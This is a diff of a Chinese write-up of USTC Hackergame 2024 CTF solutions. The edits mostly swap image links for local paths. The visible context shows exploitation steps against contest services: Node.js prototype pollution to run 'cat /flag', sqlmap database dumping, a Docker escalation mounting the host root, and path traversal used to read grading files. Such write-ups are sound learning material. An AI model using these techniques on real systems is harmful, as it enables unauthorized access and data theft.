@@ -1,10 +1,4 @@
-（喂饭级wp）
-
-# 摘要
-
-本文详细记录了中国科学技术大学（USTC）Hackergame 2024的解题过程，涵盖了从签到题到高级逆向工程挑战的多个领域的网络安全问题。文中首先介绍了如何通过多语言翻译和简单的逻辑推理快速获得初始flag，随后深入探讨了CTF（Capture The Flag）比赛中的各类典型题目，包括但不限于Web安全、密码学、逆向工程、Pwn（二进制漏洞利用）和区块链技术。每个题目的解法都详细阐述了背后的技术原理和解题思路，同时提供了关键代码和命令行操作，以供读者复现和学习。文章最后通过对每个题目的分析，展示了CTF比赛中解题的多样性和创造性，为网络安全爱好者和专业人士提供了宝贵的实战经验和学习资源。
-
-**关键词**   Hackergame 2024；CTF（Capture The Flag）；网络安全；Web安全；密码学；逆向工程；Pwn；区块链；解题策略；技术实战
+不多bb，直接开始。
 
 # 签到
 
@@ -12,19 +6,19 @@
 
 访问题目后，我们需要输入12种语言的“启动”。
 
-![](https://pic.imgdb.cn/item/672f00f3d29ded1a8c3064c9.png)
+![](images/672f00f3d29ded1a8c3064c9.png)
 
 真的要安装12种输入法吗？对，对吗？
 
 直接启动，先听歌：
 
-![](https://pic.imgdb.cn/item/672f0163d29ded1a8c30b943.png)
+![](images/672f0163d29ded1a8c30b943.png)
 
 听歌结束后，注意到：http://202.38.93.141:12024/?pass=`false`
 
 把false改为true即获得flag：flag{WE1cOME-to-h@CKErgAMe-anD-eNjoY-hACkiN9-z0Z4}
 
-![](https://pic.imgdb.cn/item/672f3c36d29ded1a8c6a27c7.jpg)
+![](images/672f3c36d29ded1a8c6a27c7.jpg)
 
 ```
 [Verse]
@@ -68,11 +62,11 @@ Hackergame称霸 思路不止
 
 USTC CTF招新主页在哪呢？访问Hackergame主页：
 
-![](https://pic.imgdb.cn/item/672f027ed29ded1a8c319054.png)
+![](images/672f027ed29ded1a8c319054.png)
 
 进去之后是一个网页终端。
 
-![](https://pic.imgdb.cn/item/672f02d4d29ded1a8c31d3db.png)
+![](images/672f02d4d29ded1a8c31d3db.png)
 
 输入help查看一下可用命令：
 
@@ -97,7 +91,7 @@ Credit: Based on Cveinnt's awesome LiveTerm.
 
 首先执行sudo看看，发现会跳转到B站观看《奶龙》动画。右下角有备案号：
 
-![](https://pic.imgdb.cn/item/672f0351d29ded1a8c3239df.png)
+![](images/672f0351d29ded1a8c3239df.png)
 
 ~~故flag为`flag{0910417220504011}`，提交到比赛平台提示“答案错误”，等完赛后你就会出现在搞笑flag里。~~
 
@@ -141,7 +135,7 @@ ez。
 
    在USTC LUG网站一番探索，发现在`https://lug.ustc.edu.cn/wiki/lug/events/hackergame/`下有第二届（2014+1）Hackergame的活动归档：
 
-   ![](https://pic.imgdb.cn/item/672f05c7d29ded1a8c344bc8.png)
+   ![](images/672f05c7d29ded1a8c344bc8.png)
 
    进入此页面，注意到
 
@@ -155,7 +149,7 @@ ez。
 
    在Hackergame主页找到往年新闻稿：
 
-   ![](https://pic.imgdb.cn/item/672f0662d29ded1a8c34cb8d.png)
+   ![](images/672f0662d29ded1a8c34cb8d.png)
 
    结合往年Write-Up中的题目数量得知，答案为2682人，是2019年的Hackergame（第六届）。
 
@@ -171,7 +165,7 @@ ez。
 
 4. 在今年的 USENIX Security 学术会议上中国科学技术大学发表了一篇关于电子邮件伪造攻击的论文，在论文中作者提出了 6 种攻击方法，并在多少个电子邮件服务提供商及客户端的组合上进行了实验？**（10 分）**
 
-   ![](https://pic.imgdb.cn/item/672f07b1d29ded1a8c35ef7f.png)
+   ![](images/672f07b1d29ded1a8c35ef7f.png)
 
    答案为336。
 
@@ -271,7 +265,7 @@ ez。
 
 使用`https://www.3dpea.com/cn/view-STL-online`在线浏览盒子STL模型，摄像头伸进去即可看到flag。
 
-![](https://pic.imgdb.cn/item/672f0bc9d29ded1a8c39f5c7.png)
+![](images/672f0bc9d29ded1a8c39f5c7.png)
 
 # 比大小王
 
@@ -294,7 +288,7 @@ ez。
 
 查看网络包：
 
-![](https://pic.imgdb.cn/item/672f0d47d29ded1a8c3b3325.png)
+![](images/672f0d47d29ded1a8c3b3325.png)
 
 题目数据存储在state.values内。因此，只需要在倒计时结束后打开F12执行
 
@@ -312,7 +306,7 @@ submit(state.values.map(([a,b]) => a<b? '<' : '>' ))
 
 > > 你们的生活到底真的假的呀？每天要么就是看漫展看偶像看 live 喝酒吃烧烤，要么就是这里那里旅游。阵容一宣，说冲就冲，群一拉，机票一买，钱就像大风刮来的，时间好像一直有。c\*\*4 你们也去，mu\*\*ca 你们也去，m\*\*o 你们也去，to\*ea\*i 你们也去。我怎么一天到晚都在上班啊，你们那到底是怎么弄的呀？教教我行不行
 >
-> ![](https://pic.imgdb.cn/item/672f1062d29ded1a8c3da79c.png)
+> ![](images/672f1062d29ded1a8c3da79c.png)
 >
 > 
 
@@ -320,13 +314,13 @@ submit(state.values.map(([a,b]) => a<b? '<' : '>' ))
 
    高德搜索“科里科气科大驿站”，既然是距离中科大哪个门最近，那肯定是科大站。答案为东校区西门。
 
-![](https://pic.imgdb.cn/item/672f0f5fd29ded1a8c3cee25.png)
+![](images/672f0f5fd29ded1a8c3cee25.png)
 
 2. 话说 Leo 酱上次出现在桁架上是……科大今年的 ACG 音乐会？活动日期我没记错的话是？（格式：`YYYYMMDD`）
 
    B站搜索“中科大ACG音乐会”，找到“中科大LEO动漫协会”账号，翻找动态发现：
 
-   ![](https://pic.imgdb.cn/item/672f10f2d29ded1a8c3e17e4.png)
+   ![](images/672f10f2d29ded1a8c3e17e4.png)
 
    答案为20240519。
 
@@ -336,9 +330,9 @@ submit(state.values.map(([a,b]) => a<b? '<' : '>' ))
 >
 > 这样想着，你打开自己的相册翻找，「我记得之前保存了几个还不错的地方……」
 >
-> ![](https://pic.imgdb.cn/item/672f117ad29ded1a8c3e8b03.png)
+> ![](images/672f117ad29ded1a8c3e8b03.png)
 >
-> ![](https://pic.imgdb.cn/item/672f11a9d29ded1a8c3eb230.png)
+> ![](images/672f11a9d29ded1a8c3eb230.png)
 >
 > 嗯？奇怪的记忆增加了。诶，我到过这些地方吗？而且这两张照片拍摄地的距离……是不是有点远？
 
@@ -346,11 +340,11 @@ submit(state.values.map(([a,b]) => a<b? '<' : '>' ))
 
    注意到垃圾桶上有“六安园林”字样。
 
-   ![](https://pic.imgdb.cn/item/672f120ed29ded1a8c3f052d.png)
+   ![](images/672f120ed29ded1a8c3f052d.png)
 
    注意到公园步道上有彩虹，故搜索“六安  彩虹  步道”：
 
-   ![](https://pic.imgdb.cn/item/672f128ad29ded1a8c3f66b0.png)
+   ![](images/672f128ad29ded1a8c3f66b0.png)
 
    答案为中央公园。
 
@@ -360,7 +354,7 @@ submit(state.values.map(([a,b]) => a<b? '<' : '>' ))
 
    使用Google Lens搜索目标图片：
 
-   ![](https://pic.imgdb.cn/item/672f1351d29ded1a8c40117e.png)
+   ![](images/672f1351d29ded1a8c40117e.png)
 
    答案为坛子岭。
 
@@ -368,7 +362,7 @@ submit(state.values.map(([a,b]) => a<b? '<' : '>' ))
 
 > 调查自己还是头一回，多新鲜啊。不过，还没来得及理清头绪，你突然收到了来自学长的信息：
 >
-> > ![](https://pic.imgdb.cn/item/672f13ced29ded1a8c408002.png)
+> > ![](images/672f13ced29ded1a8c408002.png)
 > >
 > > 来练练手，看看能挖出什么有趣的东西。
 >
@@ -380,13 +374,13 @@ submit(state.values.map(([a,b]) => a<b? '<' : '>' ))
 
    CRH6A-A主要用于成都“天府号”，涂装如下：
 
-   ![](https://pic.imgdb.cn/item/672f1507d29ded1a8c418f64.png)
+   ![](images/672f1507d29ded1a8c418f64.png)
 
    很明显涂装不符合。
 
    CRH6F-A主要用于北京、台州、连云港、阳泉、海口等市域铁路。发现北京“怀密号”的涂装符合图片特征：
 
-   ![](https://pic.imgdb.cn/item/672f1594d29ded1a8c420d8a.png)
+   ![](images/672f1594d29ded1a8c420d8a.png)
 
    故答案为CRH6F-A。位于北京。
 
@@ -394,17 +388,17 @@ submit(state.values.map(([a,b]) => a<b? '<' : '>' ))
 
    注意到图片内清一色停放动车组，且：
 
-   ![](https://pic.imgdb.cn/item/672f162dd29ded1a8c428228.png)
+   ![](images/672f162dd29ded1a8c428228.png)
 
    CR-复兴号。故此处为动车所。
 
    高德搜索“北京 动车所”，并寻找附近有医院的动车所。注意到：
 
-   ![](https://pic.imgdb.cn/item/672f172dd29ded1a8c43ac63.png)
+   ![](images/672f172dd29ded1a8c43ac63.png)
 
    卫星图特征吻合。
 
-   ![](https://pic.imgdb.cn/item/672f17dad29ded1a8c4469a7.png)
+   ![](images/672f17dad29ded1a8c4469a7.png)
 
    故答案为 积水潭医院。
 
@@ -467,23 +461,23 @@ file.open读入char类型文件名时，会在0x00处截断。因此，当你在
 
 所以，我们只需要把“Z:/theflag”在UTF-8下转换为HEX：
 
-![](https://pic.imgdb.cn/item/672f1db3d29ded1a8c49b16e.png)
+![](images/672f1db3d29ded1a8c49b16e.png)
 
 然后把得到的HEX后面加上`00XX`以隔断char。XX随便填，最好是能解出来个可见字符。再把处理好的HEX在UTF16-LE下转换回来：
 
-![](https://pic.imgdb.cn/item/672f1e45d29ded1a8c4a492f.png)
+![](images/672f1e45d29ded1a8c4a492f.png)
 
 把解出来的内容输入进去就能拿到flag了。
 
 # PowerfulShell
 
-![](https://pic.imgdb.cn/item/672f1ea2d29ded1a8c4a9c56.png)
+![](images/672f1ea2d29ded1a8c4a9c56.png)
 
 感兴趣可看官方题解。
 
 # Node.JS is Web Scale
 
-![](https://pic.imgdb.cn/item/672f1f0ad29ded1a8c4b01e8.png)
+![](images/672f1f0ad29ded1a8c4b01e8.png)
 
 打开后是一个Node.JS KV Store。我们的目标是拿到`/flag`。
 
@@ -529,11 +523,11 @@ console.log(a.bar); // 输出: 'foo'; 实际为a.__proto__.bar
 
 故思路已非常清晰：我们只需要向页面提供的键值对的原型插入恶意代码，即可访问到`/flag`。
 
-![](https://pic.imgdb.cn/item/672f248ad29ded1a8c50b3aa.png)
+![](images/672f248ad29ded1a8c50b3aa.png)
 
 访问`/execute?cmd=evil`即可执行`cat /flag`。
 
-![](https://pic.imgdb.cn/item/672f24bcd29ded1a8c50f948.png)
+![](images/672f24bcd29ded1a8c50f948.png)
 
 # PaoluGPT
 
@@ -567,7 +561,7 @@ def execute_query(s: str, fetch_all: bool = False):
         return res.fetchone()
 ```
 
-![](https://pic.imgdb.cn/item/672f262ad29ded1a8c52c81c.png)
+![](images/672f262ad29ded1a8c52c81c.png)
 
 哥们！！（原子吐息）上sqlmap，干他！
 
@@ -677,11 +671,11 @@ $ ... -T 'messages' -C 'id,shown' --dump
 
 哥们！！！库脱下来了！！查数据！
 
-![](https://pic.imgdb.cn/item/672f3354d29ded1a8c614714.png)
+![](images/672f3354d29ded1a8c614714.png)
 
 访问`/view?conversation_id=cb30e667-1ba7-4863-a9c9-8773dfaac619`，拉到页面最底部即可获得flag。
 
-![](https://pic.imgdb.cn/item/672f33d1d29ded1a8c61db83.png)
+![](images/672f33d1d29ded1a8c61db83.png)
 
 ## 千里挑一
 
@@ -862,7 +856,7 @@ for i in range(num_tests):
 
 但是我不喜欢造轮子，经过一番寻找，在外网找到了一位大佬在2007年发的一篇博客，给出了使用DFA和状态消除法达到上述目的的Haskell代码。不过2007年的代码到现在已有兼容问题，做一些修改后正常运行了。修改后的代码已上传到Glot.IO Snippet：https://glot.io/snippets/h1mudpsx58
 
-![](https://pic.imgdb.cn/item/672f47c7d29ded1a8c77775d.png)
+![](images/672f47c7d29ded1a8c77775d.png)
 
 使用生成的正则表达式提交即获得Flag 2。
 
@@ -947,7 +941,7 @@ $$
 $$
 故构建$$f(x)=4\sqrt{(1-x^2)}-4(1-x^2)$$，即`4*(1-x**2)**(1/2)-4*(1-x**2)`，其在[0,1]定积分即为$$\pi-\frac{8}{3}$$。非负性证明略。
 
-![](https://pic.imgdb.cn/item/672f5535d29ded1a8c874927.png)
+![](images/672f5535d29ded1a8c874927.png)
 
 # Docker for Everyone Plus
 
@@ -982,9 +976,9 @@ passwd root
 #输入root密码
 exit
 docker container stop alpine
-docker commit alpine PwfulAlpine
-docker save -o /path/to/PwfulAlpine.tar PwfulAlpine  #生成tar有8M
-gzip -9 -k /path/to/PwfulAlpine.tar
+docker commit alpine alpine0
+docker save -o /path/to/alpine0.tar alpine0  #生成tar有8M
+gzip -9 -k /path/to/alpine0.tar
 ```
 
 然后，这边建议您使用 ***Arch Linux*** 进行ZModem文件上传。在Windows内由于未知原因，Xshell上传没速度。若您是Windows的忠实用户，官方writeup的说法是：
@@ -999,12 +993,12 @@ cd /tmp/abc
 rz
 ```
 
-即可启动文件传输。选择你打好的`PwfulAlpine.tar.gz`，上传完成后
+即可启动文件传输。选择你打好的`alpine0.tar.gz`，上传完成后
 
 ```bash
-gzip -d PwfulAlpine.tar.gz
-cat PwfulAlpine.tar | sudo /usr/bin/docker image load
-sudo docker run --rm -u 1000:1000 -it --ipc=host --device=/dev/vdb -v /:/out PwfulAlpine
+gzip -d alpine0.tar.gz
+cat alpine0.tar | sudo /usr/bin/docker image load
+sudo docker run --rm -u 1000:1000 -it --ipc=host --device=/dev/vdb -v /:/out alpine0
 su root
 #输入root密码
 cat /out/flag
@@ -1439,7 +1433,7 @@ sendReq(b'\x1b\\\n')
 
 发送后即可启动http服务，访问`/flag2`即得flag。
 
-![](https://pic.imgdb.cn/item/672f9b24d29ded1a8cc9761e.png)
+![](images/672f9b24d29ded1a8cc9761e.png)
 
 完整程序：
 
@@ -1685,7 +1679,7 @@ if __name__ == '__main__':
 
 写好后直接启动BurpSuite，随便选一个文件，开始拦包点上传。
 
-![](https://pic.imgdb.cn/item/672fa53cd29ded1a8cd0825d.png)
+![](images/672fa53cd29ded1a8cd0825d.png)
 
 注意到`filepath = os.path.join(UPLOAD_DIR, filename)`。这玩意除了拼接文件路径还有个特性：若存在以`/`开头的路径，从最后一个以`/`开头的路径开始拼接，之前参数全部丢弃；我们把上传路径改为绝对路径，`os.path.join()`总是会返回我们的绝对路径。
 
@@ -1693,7 +1687,7 @@ if __name__ == '__main__':
 
 查看题目逻辑，发现同目录下answers.json为评分数据。直接访问`/run?command=cat answers.json`获取：
 
-![](https://pic.imgdb.cn/item/672fa687d29ded1a8cd16c22.png)
+![](images/672fa687d29ded1a8cd16c22.png)
 
 转换成ASCII：
 
@@ -1720,17 +1714,17 @@ convert_to_ascii(NUMBERS)
 
 下载来附件，发现是二进制文件，逆向题
 
-![](https://pic.imgdb.cn/item/672fa8ded29ded1a8cd2ed6b.png)
+![](images/672fa8ded29ded1a8cd2ed6b.png)
 
 **！！！全网呼叫法国女人！！！**
 
-![](https://pic.imgdb.cn/item/672fa94cd29ded1a8cd335ad.jpg)
+![](images/672fa94cd29ded1a8cd335ad.jpg)
 
-![](https://pic.imgdb.cn/item/672faa31d29ded1a8cd3b700.png)
+![](images/672faa31d29ded1a8cd3b700.png)
 
 这......SHA256能碰？哥们没开玩笑吧？再看一眼......
 
-![](https://pic.imgdb.cn/item/672fac6bd29ded1a8cd51606.png)
+![](images/672fac6bd29ded1a8cd51606.png)
 
 你这hash怎么还int的......这不才4个字节？再看一眼。官方writeup使用OpenAI o1把伪代码转成Python了，这里手算一下，了解一下原理。
 
@@ -1808,6 +1802,3 @@ if __name__ == "__main__":
 
 只使用13.79秒就找到了艺术级三碰撞。
 
-# 致谢
-
-在此，我要感谢[@余胜军说java编程](https://space.bilibili.com/480840386)，他的乐子视频对缓和本次比赛的焦灼气氛至关重要。
